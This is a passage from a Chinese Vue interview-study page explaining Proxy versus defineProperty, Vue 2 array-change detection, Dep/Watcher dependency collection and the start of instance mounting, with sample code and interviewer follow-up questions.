id=\\"说说你对-proxy-的理解-proxy-相比于-defineproperty-的优势\\"><a class=\\"header-anchor\\" href=\\"#说说你对-proxy-的理解-proxy-相比于-defineproperty-的优势\\">#</a> 说说你对 proxy 的理解，Proxy 相比于 defineProperty 的优势</h3>\\n<p><strong><code>Object.defineProperty()</code> 的问题主要有三个：</strong></p>\\n<ul>\\n<li><strong>不能监听数组的变化</strong>：无法监控到数组下标的变化，导致通过数组下标添加元素，不能实时响应</li>\\n<li><strong>必须遍历对象的每个属性</strong>：只能劫持对象的属性，从而需要对每个对象，每个属性进行遍历，如果属性值是对象，还需要深度遍历。<code>Proxy</code> 可以劫持整个对象，并返回一个新的对象</li>\\n<li><strong>必须深层遍历嵌套的对象</strong></li>\\n</ul>\\n<p><strong>Proxy的优势如下:</strong></p>\\n<ul>\\n<li>针对对象：<strong>针对整个对象，而不是对象的某个属性</strong>，所以也就不需要对 <code>keys</code> 进行遍历</li>\\n<li>支持数组：<code>Proxy</code> 不需要对数组的方法进行重载，省去了众多 hack，减少代码量等于减少了维护成本，而且标准的就是最好的</li>\\n<li><code>Proxy</code>的第二个参数可以有 <code>13</code> 种拦截方：不限于<code>apply</code>、<code>ownKeys</code>、<code>deleteProperty</code>、<code>has</code>等等是<code>Object.defineProperty</code>不具备的</li>\\n<li><code>Proxy</code>返回的是一个新对象,我们可以只操作新的对象达到目的,而<code>Object.defineProperty</code>只能遍历对象属性直接修改</li>\\n<li><code>Proxy</code>作为新标准将受到浏览器厂商重点持续的性能优化，也就是传说中的新标准的性能红利</li>\\n</ul>\\n<p><a href=\\"https://es6.ruanyifeng.com/#docs/proxy\\">proxy详细使用点击查看</a></p>\\n<p><strong>Object.defineProperty的优势如下:</strong></p>\\n<blockquote>\\n<p>兼容性好，支持 <code>IE9</code>，而 <code>Proxy</code> 的存在浏览器兼容性问题,而且无法用 <code>polyfill</code> 磨平</p>\\n</blockquote>\\n<p><strong>defineProperty的属性值有哪些</strong></p>\\n<pre class=\\"language-js\\"><code>Object.defineProperty(obj, prop, descriptor)\\n\\n// obj 要定义属性的对象\\n// prop 要定义或修改的属性的名称\\n// descriptor 要定义或修改的属性描述符\\n\\nObject.defineProperty(obj,&quot;name&quot;,{\\n  value:&quot;poetry&quot;, // 初始值\\n  writable:true, // 该属性是否可写入\\n  enumerable:true, // 该属性是否可被遍历得到（for...in， Object.keys等）\\n  configurable:true, // 定该属性是否可被删除，且除writable外的其他描述符是否可被修改\\n  get: function() {},\\n  set: function(newVal) {}\\n})\\n</code></pre>\\n<p><strong>相关代码如下</strong></p>\\n<pre class=\\"language-js\\"><code>import { mutableHandlers } from &quot;./baseHandlers&quot;; // 代理相关逻辑\\nimport { isObject } from &quot;./util&quot;; // 工具方法\\n\\nexport function reactive(target) {\\n  // 根据不同参数创建不同响应式对象\\n  return createReactiveObject(target, mutableHandlers);\\n}\\nfunction createReactiveObject(target, baseHandler) {\\n  if (!isObject(target)) {\\n    return target;\\n  }\\n  const observed = new Proxy(target, baseHandler);\\n  return observed;\\n}\\n\\nconst get = createGetter();\\nconst set = createSetter();\\n\\nfunction createGetter() {\\n  return function get(target, key, receiver) {\\n    // 对获取的值进行放射\\n    const res = Reflect.get(target, key, receiver);\\n    console.log(&quot;属性获取&quot;, key);\\n    if (isObject(res)) {\\n      // 如果获取的值是对象类型，则返回当前对象的代理对象\\n      return reactive(res);\\n    }\\n    return res;\\n  };\\n}\\nfunction createSetter() {\\n  return function set(target, key, value, receiver) {\\n    const oldValue = target[key];\\n    const hadKey = hasOwn(target, key);\\n    const result = Reflect.set(target, key, value, receiver);\\n    if (!hadKey) {\\n      console.log(&quot;属性新增&quot;, key, value);\\n    } else if (hasChanged(value, oldValue)) {\\n      console.log(&quot;属性值被修改&quot;, key, value);\\n    }\\n    return result;\\n  };\\n}\\nexport const mutableHandlers = {\\n  get, // 当获取属性时调用此方法\\n  set, // 当修改属性时调用此方法\\n};\\n</code></pre>\\n<p><code>Proxy</code>只会代理对象的第一层，那么<code>Vue3</code>又是怎样处理这个问题的呢？</p>\\n<blockquote>\\n<p>判断当前<code>Reflect.get的</code>返回值是否为<code>Object</code>，如果是则再通过<code>reactive</code>方法做代理， 这样就实现了深度观测。</p>\\n</blockquote>\\n<p><strong>监测数组的时候可能触发多次get/set，那么如何防止触发多次呢？</strong></p>\\n<blockquote>\\n<p>我们可以判断<code>key</code>是否为当前被代理对象<code>target</code>自身属性，也可以判断旧值与新值是否相等，只有满足以上两个条件之一时，才有可能执行<code>trigger</code></p>\\n</blockquote>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>表格页使用 <code>reactive({ rows: [] })</code>，开发者认为 <code>Proxy</code> 只代理第一层，所以执行 <code>state.rows[0].selected = true</code> 不可能响应；你会怎样纠正这个判断？</strong></p>\\n<p>外层 <code>Proxy</code> 的确先代理对象本身，但读取 <code>rows</code> 或数组元素时，<code>get</code> 会把返回的对象继续交给 <code>reactive</code>，形成按访问触发的深层代理。只要后续读写始终经过代理对象，嵌套修改就能被追踪；若保留并修改原始对象引用，则可能绕开拦截。</p>\\n</li>\\n<li>\\n<p><strong>一个包含大量嵌套配置的页面在响应式初始化阶段卡顿，架构师在 <code>defineProperty</code> 与 <code>Proxy</code> 之间争论；<code>Proxy</code> 的工程优势具体落在哪里？</strong></p>\\n<p><code>Proxy</code> 面向整个对象建立代理，不必在初始化时遍历每个键并立即递归安装访问器，嵌套对象可在 <code>get</code> 返回时再代理。它还能统一处理数组索引、属性新增和删除，减少数组方法重写及特殊 <code>API</code>；实际收益仍受访问规模和业务逻辑影响，不能仅凭机制承诺固定性能幅度。</p>\\n</li>\\n<li>\\n<p><strong>兼容旧版浏览器的企业系统准备从 <code>Vue 2</code> 迁移，产品要求保留原有兼容范围，技术负责人说给 <code>Proxy</code> 加一个 <code>polyfill</code> 就行，你同意吗？</strong></p>\\n<p>不能把 <code>Proxy</code> 当作可由普通 <code>polyfill</code> 完整补齐的能力，它依赖语言层面的对象操作拦截。若目标浏览器不支持 <code>Proxy</code>，迁移方案必须调整兼容范围、保留旧技术栈或提供降级版本；仅引入补丁库无法等价覆盖这些拦截语义。</p>\\n</li>\\n<li>\\n<p><strong>线上筛选器新增字段后触发了两次更新日志，团队怀疑 <code>Proxy</code> 的 <code>set</code> 无条件重复派发；你会检查哪些判断？</strong></p>\\n<p>先在 <code>set</code> 中区分属性是新增还是修改，并比较 <code>oldValue</code> 与新值，只有新增或值确实变化时才应触发相应更新。写入应通过 <code>Reflect.set(target, key, value, receiver)</code> 完成并返回结果；数组操作可能涉及多个键，不能看到多次陷阱调用就直接认定为重复渲染。</p>\\n</li>\\n<li>\\n<p><strong>状态层既要监听删除属性、<code>in</code> 判断和键枚举，又要维护一套 <code>defineProperty</code> 实现；为什么 <code>Proxy</code> 更适合作为底层方案？</strong></p>\\n<p><code>Proxy</code> 除 <code>get</code>、<code>set</code> 外还能拦截 <code>deleteProperty</code>、<code>has</code>、<code>ownKeys</code> 等对象操作，可让删除、成员判断和遍历建立统一的响应式语义。<code>defineProperty</code> 只能围绕既有属性描述符工作，需要额外 <code>API</code> 和补丁弥补缺口；代价是 <code>Proxy</code> 返回新对象，调用方必须避免混用原对象与代理对象。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_5-vue中如何检测数组变化\\"><a class=\\"header-anchor\\" href=\\"#_5-vue中如何检测数组变化\\">#</a> 5 Vue中如何检测数组变化</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>Vue 2</code> 无法用 <code>defineProperty</code> 拦截数组下标赋值和 <code>length</code>，所以<strong>重写了七个变更方法</strong></li>\\n<li>七个方法：<code>push</code>/<code>pop</code>/<code>shift</code>/<code>unshift</code>/<code>splice</code>/<code>sort</code>/<code>reverse</code></li>\\n<li>做法是给数组的原型链插一层：新原型上的方法先调原生方法，再 <code>ob.dep.notify()</code> 通知更新</li>\\n<li>新增元素还要走一次 <code>observeArray</code> 做响应式处理，否则新对象不是响应式的</li>\\n<li>所以 <code>arr[0] = x</code> 和 <code>arr.length = 0</code> 不生效，要用 <code>splice</code> 或 <code>Vue.set</code>；<code>Vue 3</code> 的 <code>Proxy</code> 没有这个问题</li>\\n</ul>\\n<p><strong><code>Vue 2</code> 通过改写七个数组变更方法，在执行原生操作后主动通知依赖更新。</strong> 它会在数组原型链中插入一层，拦截 <code>push</code>、<code>splice</code>、<code>sort</code> 等方法，并用 <code>ob.dep.notify()</code> 触发视图更新。新增元素如果是对象，还要经过 <code>observeArray</code> 继续做响应式处理。直接修改下标或 <code>length</code> 检测不到，要用 <code>splice</code> 或 <code>Vue.set</code>；<code>Vue 3</code> 的 <code>Proxy</code> 没有这个限制。</p>\\n</section>\\n<blockquote>\\n<p><strong>版本说明</strong>：本节的「数组变动检测不到」是 <strong>Vue 2</strong> 的 <code>Object.defineProperty</code> 局限。<strong>Vue 3 用 <code>Proxy</code> 后已能直接检测数组下标赋值和 <code>length</code> 变化</strong>，<code>vm.items[i] = x</code>、<code>vm.items.length = n</code> 都是响应式的，<strong>不再需要 <code>Vue.set</code> / <code>splice</code> 变通</strong>。以下内容作为「Vue 2 为什么检测不到、当年怎么绕过」的历史对照来看。</p>\\n</blockquote>\\n<p><strong>前言</strong></p>\\n<p><code>Vue</code>（Vue 2）不能检测到以下数组的变动：</p>\\n<ul>\\n<li>当你利用索引直接设置一个数组项时，例如：<code>vm.items[indexOfItem] = newValue</code></li>\\n<li>当你修改数组的长度时，例如：<code>vm.items.length = newLength</code></li>\\n</ul>\\n<p><code>Vue</code> 提供了以下操作方法</p>\\n<pre class=\\"language-js\\"><code>// Vue.set\\nVue.set(vm.items, indexOfItem, newValue)\\n// vm.$set，Vue.set的一个别名\\nvm.$set(vm.items, indexOfItem, newValue)\\n// Array.prototype.splice\\nvm.items.splice(indexOfItem, 1, newValue)\\n</code></pre>\\n<p><strong>分析</strong></p>\\n<blockquote>\\n<p>数组考虑性能原因没有用 <code>defineProperty</code> 对数组的每一项进行拦截，而是选择对 <code>7</code> 种数组（<code>push</code>,<code>shift</code>,<code>pop</code>,<code>splice</code>,<code>unshift</code>,<code>sort</code>,<code>reverse</code>）方法进行重写(<code>AOP</code> 切片思想)</p>\\n</blockquote>\\n<p>所以在 <code>Vue</code> 中修改数组的索引和长度是无法监控到的。需要通过以上 <code>7</code> 种变异方法修改数组才会触发数组对应的 <code>watcher</code> 进行更新</p>\\n<ul>\\n<li>用函数劫持的方式，重写了数组方法，具体呢就是更改了数组的原型，更改成自己的，用户调数组的一些方法的时候，走的就是自己的方法，然后通知视图去更新</li>\\n<li>数组里每一项可能是对象，那么我就是会对数组的每一项进行观测（且只有数组里的对象才能进行观测，观测过的也不会进行观测）</li>\\n</ul>\\n<p><strong>原理</strong></p>\\n<blockquote>\\n<p><code>Vue</code> 将 <code>data</code> 中的数组，进行了原型链重写。指向了自己定义的数组原型方法，这样当调用数组<code>api</code> 时，可以通知依赖更新，如果数组中包含着引用类型。会对数组中的引用类型再次进行监控。</p>\\n</blockquote>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/7c69c59722899f6a.png\\" alt=\\"\\"></p>\\n<p>手写简版分析</p>\\n<pre class=\\"language-js\\"><code>let oldArray = Object.create(Array.prototype);\\n[&#39;shift&#39;, &#39;unshift&#39;, &#39;push&#39;, &#39;pop&#39;, &#39;reverse&#39;,&#39;sort&#39;].forEach(method =&gt; {\\n    oldArray[method] = function() { // 这里可以触发页面更新逻辑\\n        console.log(&#39;method&#39;, method)\\n        Array.prototype[method].call(this,...arguments);\\n    }\\n});\\nlet arr = [1,2,3];\\narr.__proto__ = oldArray;\\narr.unshift(4);\\n</code></pre>\\n<p>源码分析</p>\\n<pre class=\\"language-js\\"><code>// 拿到数组原型拷贝一份\\nconst arrayProto = Array.prototype \\n// 然后将arrayMethods继承自数组原型\\n// 这里是面向切片编程思想（AOP）--不破坏封装的前提下，动态的扩展功能\\nexport const arrayMethods = Object.create(arrayProto) \\nconst methodsToPatch = [ &#39;push&#39;, &#39;pop&#39;, &#39;shift&#39;, &#39;unshift&#39;, &#39;splice&#39;, &#39;sort&#39;, &#39;reverse&#39; ]\\n\\nmethodsToPatch.forEach(function (method) { // 重写原型方法 \\n    const original = arrayProto[method] // 调用原数组的方法 \\n\\n    def(arrayMethods, method, function mutator (...args) { \\n        // 这里保留原型方法的执行结果\\n        const result = original.apply(this, args) \\n        // 这句话是关键\\n        // this代表的就是数据本身 比如数据是{a:[1,2,3]} 那么我们使用a.push(4)  this就是a  ob就是a.__ob__ 这个属性就是上段代码增加的 代表的是该数据已经被响应式观察过了指向Observer实例\\n        const ob = this.__ob__ \\n\\n        // 这里的标志就是代表数组有新增操作\\n        let inserted\\n        switch (method) { \\n            case &#39;push&#39;: \\n            case &#39;unshift&#39;: \\n                inserted = args \\n                break \\n            case &#39;splice&#39;: \\n                inserted = args.slice(2) \\n                break \\n        }\\n        // 如果有新增的元素 inserted是一个数组 调用Observer实例的observeArray对数组每一项进行观测\\n        if (inserted) ob.observeArray(inserted) \\n\\n        ob.dep.notify() // 当调用数组方法后，手动通知视图更新 \\n\\n        return result \\n    }) \\n})\\n\\nthis.observeArray(value) // 进行深度监控\\n</code></pre>\\n<blockquote>\\n<p><code>vue3</code>：改用 <code>proxy</code> ，可直接监听对象数组的变化</p>\\n</blockquote>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong><code>Vue 2</code> 库存表执行 <code>this.rows[3] = patchedRow</code> 后控制台能看到新值，行内容却没变；同事认为数组元素也是对象，递归观测应该能兜底，你怎么解释？</strong></p>\\n<p>递归观测只能处理数组中对象已有属性的变化，不能让数组索引赋值本身被检测到。应使用 <code>this.$set(this.rows, 3, patchedRow)</code> 或 <code>this.rows.splice(3, 1, patchedRow)</code>；直接写索引没有经过被重写的数组方法，因此不会通知数组的依赖。</p>\\n</li>\\n<li>\\n<p><strong>实时日志页维护几千条记录，需要追加、头部插入和批量替换；在 <code>Vue 2</code> 中怎样写才能让新插入的对象也继续响应？</strong></p>\\n<p>追加和头插分别使用 <code>push</code>、<code>unshift</code>，批量替换用 <code>splice</code>，这些方法已被 <code>Vue 2</code> 包装。包装逻辑会识别 <code>push</code>、<code>unshift</code>、<code>splice</code> 带入的新元素，对其中的引用类型继续观测，再调用数组对应的 <code>dep.notify()</code>；直接写下标会跳过这条链路。</p>\\n</li>\\n<li>\\n<p><strong>同一套组件同时维护 <code>Vue 2</code> 和 <code>Vue 3</code> 分支，代码规范要求清空数组一律用 <code>splice(0)</code>；这个限制在两个版本中是否都必要？</strong></p>\\n<p>在 <code>Vue 2</code> 中，直接执行 <code>items.length = 0</code> 无法被检测，使用 <code>splice(0)</code> 或整体替换数组更可靠。<code>Vue 3</code> 的 <code>Proxy</code> 能拦截数组下标和 <code>length</code> 变化，因此该限制不再是响应式所必需；保留统一写法可以降低分支差异，但不应误判为 <code>Vue 3</code> 的技术约束。</p>\\n</li>\\n<li>\\n<p><strong>购物车调用 <code>items.push(product)</code> 后数量更新了，但随后执行 <code>items[items.length - 1].count++</code> 没反应；你会如何定位是数组问题还是对象问题？</strong></p>\\n<p>先确认插入操作确实走了被重写的 <code>push</code>，因为它会通过 <code>observeArray</code> 观测新对象。再检查 <code>count</code> 是否在插入对象中已经存在：已有属性会被劫持，后来直接新增的属性仍需 <code>$set</code>；数组方法生效并不意味着对象的任意新增键也能被检测。</p>\\n</li>\\n<li>\\n<p><strong>代码评审中有人建议给数组每个索引都执行 <code>Object.defineProperty</code>，以便保留 <code>items[i] = value</code> 写法；在 <code>Vue 2</code> 项目里你会接受吗？</strong></p>\\n<p>通常不接受，<code>Vue 2</code> 正是出于数组规模和变动特征的考虑，没有为每个索引建立属性拦截，而是重写七个变异方法。采用 <code>$set</code> 或 <code>splice</code> 与框架的通知、插入元素观测流程一致；自建索引劫持还要处理扩容和 <code>length</code>，维护成本高且容易与框架机制冲突。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_6-vue中如何进行依赖收集\\"><a class=\\"header-anchor\\" href=\\"#_6-vue中如何进行依赖收集\\">#</a> 6 Vue中如何进行依赖收集？</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>三个角色：<code>Observer</code>（劫持属性）、<code>Dep</code>（每个属性一个订阅者列表）、<code>Watcher</code>（订阅者）</li>\\n<li>流程：渲染前把 <code>Watcher</code> 挂到全局 <code>Dep.target</code> → 执行 <code>render</code> 读属性触发 <code>getter</code> → <code>dep.depend()</code> 收集 → 修改时 <code>setter</code> 里 <code>dep.notify()</code> 通知</li>\\n<li><code>Dep.target</code> 是个&quot;隐式传参&quot;技巧 —— <code>getter</code> 不知道谁在读它，所以先把当前 <code>Watcher</code> 记到全局</li>\\n<li>结论一：<strong>只有渲染函数里读过的属性才被收集</strong>，模板没用到的数据改了不触发更新（这是优化不是 bug）</li>\\n<li>结论二：依赖是<strong>动态</strong>的，<code>v-if</code> 切换后旧分支的依赖会在重新收集时被清掉</li>\\n</ul>\\n<p><strong>依赖收集本质上是让属性对应的 <code>Dep</code> 记住读取它的 <code>Watcher</code>，数据变化后再精准通知。</strong> 渲染前，当前 <code>Watcher</code> 会放到全局 <code>Dep.target</code>；执行 <code>render</code> 读取属性时触发 <code>getter</code>，再由 <code>dep.depend()</code> 建立关系。修改属性会进入 <code>setter</code>，通过 <code>dep.notify()</code> 通知相关 <code>Watcher</code> 更新。只有渲染时真正读过的属性才会被收集，像 <code>v-if</code> 切换后，旧分支依赖也会在重新收集时清理。</p>\\n</section>\\n<p>依赖收集要回答的是：<strong><code>Vue</code> 怎么知道&quot;这个数据变了，该更新哪些地方&quot;</strong>。</p>\\n<p>三个角色配合完成：</p>\\n<table>\\n<thead>\\n<tr>\\n<th>角色</th>\\n<th>职责</th>\\n</tr>\\n</thead>\\n<tbody>\\n<tr>\\n<td><code>Observer</code></td>\\n<td>遍历对象，给每个属性装上 <code>getter</code>/<code>setter</code></td>\\n</tr>\\n<tr>\\n<td><code>Dep</code></td>\\n<td>每个属性一个，是这个属性的&quot;订阅者列表&quot;</td>\\n</tr>\\n<tr>\\n<td><code>Watcher</code></td>\\n<td>订阅者，渲染 <code>Watcher</code>、<code>computed</code>、<code>watch</code> 各是一种</td>\\n</tr>\\n</tbody>\\n</table>\\n<p><strong>完整流程：</strong></p>\\n<pre class=\\"language-text\\"><code>1. 组件初始化 → 创建渲染 Watcher，把它挂到全局的 Dep.target 上\\n2. 执行 render 函数 → 读取模板里用到的属性 → 触发 getter\\n3. getter 里：dep.depend() 把 Dep.target（当前 Watcher）存进这个属性的 subs\\n4. render 执行完 → Dep.target 置空\\n5. 之后修改属性 → setter 里 dep.notify() → 遍历 subs 调用 watcher.update()\\n</code></pre>\\n<p><strong>为什么要有 <code>Dep.target</code> 这个全局变量？</strong></p>\\n<p>因为 <code>getter</code> 被触发时，它并不知道&quot;是谁在读我&quot;。<code>Vue</code> 的办法是：执行渲染函数之前先把当前 <code>Watcher</code> 记到全局，<code>getter</code> 里直接取这个全局值就知道订阅者是谁。这是一个非常巧妙的&quot;隐式传参&quot;技巧 —— <code>Vue 3</code> 里的 <code>activeEffect</code> 是同一个思路。</p>\\n<p><strong>这个机制带来的两个直接结论：</strong></p>\\n<ol>\\n<li><strong>只有在渲染函数里被读取过的属性才会被收集。</strong> 模板里没用到的数据改了也不会触发重渲染 —— 这是自动的性能优化，不是 bug。</li>\\n<li><strong>依赖是动态的。</strong> <code>v-if</code> 切换后，上一次分支里的属性不再被读取，重新收集时就会被移除（<code>Watcher</code> 的 <code>cleanupDeps</code> 做这件事），所以不会有&quot;改了隐藏分支的数据也触发更新&quot;的浪费。</li>\\n</ol>\\n<p>下面是简化版实现，能看清 <code>Dep</code> 和 <code>Watcher</code> 的配合：</p>\\n<ul>\\n<li>每个属性都有自己的<code>dep</code>属性，存放他所依赖的<code>watcher</code>，当属性变化之后会通知自己对应的<code>watcher</code>去更新</li>\\n<li>默认会在初始化时调用<code>render</code>函数，此时会触发属性依赖收集 <code>dep.depend</code></li>\\n<li>当属性发生修改时会触发<code>watcher</code>更新<code>dep.notify()</code></li>\\n</ul>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/196afd48958a52c3.png\\" alt=\\"\\"></p>\\n<p><strong>依赖收集简版</strong></p>\\n<pre class=\\"language-js\\"><code>let obj = { name: &#39;poetry&#39;, age: 20 };\\n\\nclass Dep {\\n    constructor() {\\n      this.subs = [] // subs [watcher]\\n    }\\n    depend() {\\n      this.subs.push(Dep.target)\\n    }\\n    notify() {\\n      this.subs.forEach(watcher =&gt; watcher.update())\\n    }\\n}\\nDep.target = null;\\nobserver(obj); // 响应式属性劫持\\n\\n// 依赖收集  所有属性都会增加一个dep属性，\\n// 当渲染的时候取值了 ，这个dep属性 就会将渲染的watcher收集起来\\n// 数据更新 会让watcher重新执行\\n\\n// 观察者模式\\n\\n// 渲染组件时 会创建watcher\\nclass Watcher {\\n    constructor(render) {\\n      this.get();\\n    }\\n    get() {\\n      Dep.target = this;\\n      render(); // 执行render\\n      Dep.target = null;\\n    }\\n    update() {\\n      this.get();\\n    }\\n}\\nconst render = () =&gt; {\\n    console.log(obj.name); // obj.name =&gt; get方法\\n}\\n\\n// 组件是watcher、计算属性是watcher\\nnew Watcher(render);\\n\\nfunction observer(value) { // proxy reflect\\n    if (typeof value === &#39;object&#39; &amp;&amp; typeof value !== null)\\n    for (let key in value) {\\n        defineReactive(value, key, value[key]);\\n    }\\n}\\nfunction defineReactive(obj, key, value) {\\n    // 创建一个dep\\n    let dep = new Dep();\\n\\n    // 递归观察子属性\\n    observer(value);\\n\\n    Object.defineProperty(obj, key, {\\n        get() { // 收集对应的key 在哪个方法（组件）中被使用\\n            if (Dep.target) { // watcher\\n                dep.depend(); // 这里会建立 dep 和watcher的关系\\n            }\\n            return value;\\n        },\\n        set(newValue) {\\n            if (newValue !== value) {\\n                observer(newValue);\\n                value = newValue; // 让key对应的方法（组件重新渲染）重新执行\\n                dep.notify()\\n            }\\n        }\\n    })\\n}\\n\\n// 模拟数据获取，触发getter\\nobj.name = &#39;poetries&#39;\\n\\n// 一个属性一个dep，一个属性可以对应多个watcher（一个属性可以在任何组件中使用、在多个组件中使用）\\n// 一个dep 对应多个watcher \\n// 一个watcher 对应多个dep （一个视图对应多个属性）\\n// dep 和 watcher是多对多的关系\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>用户中心的 <code>data</code> 定义了二十个字段，模板只读取 <code>nickname</code>；后台任务修改未展示的 <code>tokenStatus</code> 时，组件会不会因为它们属于同一个对象而重渲染？</strong></p>\\n<p>不会仅因同属一个 <code>data</code> 对象就触发该组件渲染，依赖是在渲染函数读取 <code>nickname</code> 的 <code>getter</code> 时按属性收集的。<code>tokenStatus</code> 没被该渲染 <code>Watcher</code> 读取，就不会把它加入自己的 <code>Dep</code>；若 <code>watch</code> 或 <code>computed</code> 读取了它，对应订阅者仍会收到更新。</p>\\n</li>\\n<li>\\n<p><strong>一个列表行同时读取价格、库存和权限，产品要求任一字段变化都更新该行；<code>Dep</code> 与 <code>Watcher</code> 应该是什么关系？</strong></p>\\n<p>每个响应式属性拥有自己的 <code>Dep</code>，该行的渲染 <code>Watcher</code> 在执行 <code>render</code> 时读取多个字段，因此会订阅多个 <code>Dep</code>。同一个属性也可能被多个组件、计算属性或监听器读取，所以两者是多对多关系；实现中还需去重和清理，不能简单无限追加订阅。</p>\\n</li>\\n<li>\\n<p><strong>权限页通过 <code>v-if</code> 在管理员和访客分支间切换，切到访客后管理员字段频繁变化；团队担心隐藏分支仍持续触发更新，你怎么验证？</strong></p>\\n<p>分支切换后的下一次渲染只会读取当前访客分支的数据，<code>Watcher</code> 会重新收集本轮依赖。<code>cleanupDeps</code> 会解除上一轮管理员字段中已失效的订阅，因此后续修改通常不会再唤起该渲染 <code>Watcher</code>；若其他 <code>watch</code> 或 <code>computed</code> 仍读取这些字段，它们仍可能执行。</p>\\n</li>\\n<li>\\n<p><strong>线上出现修改 <code>profile.name</code> 后视图不更新，日志确认 <code>setter</code> 已执行；你会沿依赖收集链路检查哪些节点？</strong></p>\\n<p>既然 <code>setter</code> 已执行，应先确认初次渲染读取 <code>name</code> 时 <code>Dep.target</code> 是否指向当前渲染 <code>Watcher</code>，以及 <code>dep.depend()</code> 是否建立了双向订阅。随后检查 <code>dep.notify()</code> 是否调用 <code>watcher.update()</code>，以及条件分支是否已在新一轮渲染中清理该依赖；只看到属性被劫持，不能证明订阅关系已经建立。</p>\\n</li>\\n<li>\\n<p><strong>实现简化响应式库时，有人提议把当前 <code>Watcher</code> 作为参数层层传给每个 <code>getter</code>，另一人主张使用全局 <code>Dep.target</code>；你如何评价后者的作用与风险？</strong></p>\\n<p><code>Dep.target</code> 解决了 <code>getter</code> 不知道“谁正在读取我”的问题：执行渲染或求值前设置当前 <code>Watcher</code>，读取时即可隐式建立订阅，结束后再恢复或清空。工程实现必须正确管理嵌套求值和生命周期，否则全局状态可能串到错误订阅者；<code>Vue 3</code> 的 <code>activeEffect</code> 延续了同类思路。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_7-vue实例挂载的过程中发生了什么\\"><a class=\\"header-anchor\\" href=\\"#_7-vue实例挂载的过程中发生了什么\\">#</a> 7 Vue实例挂载的过程中发生了什么</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>主线：<code>new Vue</code> → <code>_init</code> → 初始化生命周期/事件/render → <code>beforeCreate</code> → 初始化 <code>inject</code>/<code>props</code>/<code>methods</code>/<code>data</code>/<code>computed</code>/<code>watch</code> → <code>created</code> → <code>$mount</code></li>\\n<li><code>$mount</code> 里：有 <code>render</code> 用 <code>render</code>，否则把 <code>template</code>/<code>el</code> 编译成 <code>render</code> 函数</li>\\n<li>然后 <code>mountComponent</code> 创建<strong>渲染 <code>Watcher</code></strong>，它的 <code>getter</code> 就是 <code>updateComponent</code>（<code>_update(_render())</code>）</li>\\n<li><code>_render</code> 生成 <code>VNode</code>、<code>_update</code> 走 <code>patch</code> 生成真实 <code>DOM</code> → <code>mounted</code></li>\\n<li>记住关键分界：<code>created</code> 时数据已就绪但<strong>没有 <code>DOM</code></strong>，<code>mounted</code> 才有 <code>$el</code> 和 <code>$refs</code></li>\\n</ul>\\n<p><strong><code>Vue</code> 实例挂载主要完成状态初始化、首次渲染，以及后续响应式更新关系的建立。</strong> 在 <code>Vue 2</code> 中，<code>new Vue</code> 会进入 <code>_init</code>，依次初始化生命周期、事件和状态，并在 <code>beforeCreate</code>、<code>created</code> 之间完成数据处理。随后 <code>$mount</code> 把 <code>template</code> 或 <code>el</code> 编译成 <code>render</code>，再创建渲染 <code>Watcher</code>，通过 <code>_render</code> 生成 <code>VNode</code>、由 <code>_update</code> 和 <code>patch</code> 落到真实 <code>DOM</code>。因此 <code>created</code> 能访问数据但没有可用的 <code>$el</code>、<code>$refs</code>，要到 <code>mounted</code> 后才能操作。</p>\\n</section>\\n<h3 id=\\"简单\\"><a class=\\"header-anchor\\" href=\\"#简单\\">#</a> 简单</h3>\\n<div class=\\"tip\\">\\n<p><strong>分析</strong></p>\\n<p>挂载过程完成了最重要的两件事：</p>\\n<ul>\\n<li>初始化</li>\\n<li>建立更新机制</li>\\n</ul>\\n<p>把这两件事说清楚即可！</p>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>挂载过程指的是<code>app.mount()</code>过程，这个过程中整体上做了两件事：<strong>初始化</strong>和<strong>建立更新机制</strong></li>\\n<li>初始化会创建组件实例、初始化组件状态，创建各种响应式数据</li>\\n<li>建立更新机制这一步会立即执行一次组件更新函数，这会首次执行组件渲染函数并执行<code>patch</code>将前面获得<code>vnode</code>转换为<code>dom</code>；同时首次执行渲染函数会创建它内部响应式数据之间和组件更新函数之间的依赖关系，这使得以后数据变化时会执行对应的更新函数</li>\\n</ol>\\n</div>\\n<p>来看一下源码，在<code>src/core/instance/index.js</code> 中</p>\\n<pre class=\\"language-js\\"><code>function Vue (options) {\\n  if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp;\\n    !(this instanceof Vue)\\n  ) {\\n    warn(&#39;Vue is a constructor and should be called with the `new` keyword&#39;)\\n  }\\n  this._init(options)\\n}\\n</code></pre>\\n<p>可以看到 <code>Vue</code> 只能通过 <code>new</code> 关键字初始化，然后会调用 <code>this._init</code> 方法， 该方法在 <code>src/core/instance/init.js</code> 中定义</p>\\n<pre class=\\"language-js\\"><code>Vue.prototype._init = function (options?: Object) {\\n  const vm: Component = this\\n  // a uid\\n  vm._uid = uid++\\n\\n  let startTag, endTag\\n  /* istanbul ignore if */\\n  if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; config.performance &amp;&amp; mark) {\\n    startTag = `vue-perf-start:${vm._uid}`\\n    endTag = `vue-perf-end:${vm._uid}`\\n    mark(startTag)\\n  }\\n\\n  // a flag to avoid this being observed\\n  vm._isVue = true\\n  // merge options\\n  if (options &amp;&amp; options._isComponent) {\\n    // optimize internal component instantiation\\n    // since dynamic options merging is pretty slow, and none of the\\n    // internal component options needs special treatment.\\n    initInternalComponent(vm, options)\\n  } else {\\n    vm.$options = mergeOptions(\\n      resolveConstructorOptions(vm.constructor),\\n      options || {},\\n      vm\\n    )\\n  }\\n  /* 